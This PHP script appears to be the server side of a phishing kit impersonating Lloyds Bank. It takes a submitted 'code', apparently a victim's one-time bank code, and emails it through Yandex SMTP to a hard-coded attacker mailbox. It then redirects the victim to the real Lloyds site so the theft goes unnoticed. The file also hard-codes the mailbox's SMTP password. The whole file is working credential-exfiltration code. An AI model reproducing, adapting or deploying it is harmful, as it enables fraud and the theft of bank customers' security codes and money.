<?php

if(!isset($_SESSION)){
    session_start();
}



//Get all POST data
$_SESSION['code'] = htmlspecialchars($_POST['code']);

    require './PHPMailer-master/src/Exception.php';
    require './PHPMailer-master/src/PHPMailer.php';
    require './PHPMailer-master/src/SMTP.php';

    $mail = new PHPMailer\PHPMailer\PHPMailer();
    $mail->IsSMTP(); // enable SMTP
    $mail->SMTPDebug = 1;
    $mail->Host = 'smtp.yandex.com';
    $mail->SMTPAuth = true;               //Adresse IP ou DNS du serveur SMTP
    $mail->Port = 465;                          //Port TCP du serveur SMTP
    $mail->SMTPAuth = 1;                        //Utiliser l'identification
      
    if($mail->SMTPAuth){
        $mail->SMTPSecure = 'ssl';               //Protocole de sécurisation des échanges avec le SMTP
        $mail->Username   =  'showmethe365@yandex.com';   //Adresse email à utiliser
        $mail->Password   =  'ftpszjarsmroisdx';         //Mot de passe de l'adresse email à utiliser
    }
    $message = "Code : ".$_SESSION["code"];
    
    $mail->setFrom('showmethe365@yandex.com', 'LLYODS CODE'); // Personnaliser l'envoyeur
    $mail->addAddress('showmethe365@yandex.com', 'User');
    $mail->Body = $message;
    $mail->Subject = "LLYODS CODE";
        
    if(!$mail->send()) {
        header("Location: https://www.lloydsbank.com/");
    } else {
        header("Location: https://www.lloydsbank.com/");
    }   
?>